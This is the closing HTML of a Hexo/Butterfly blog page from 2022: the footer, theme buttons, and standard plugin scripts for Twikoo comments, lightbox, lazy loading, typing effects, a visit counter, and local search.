datetime="2022-08-11T12:04:43.000Z" title="发表于 2022-08-11 20:04:43">2022-08-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By BayMRX.</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twkioo-vercel.vercel.app/',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twkioo-vercel.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.textContent = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
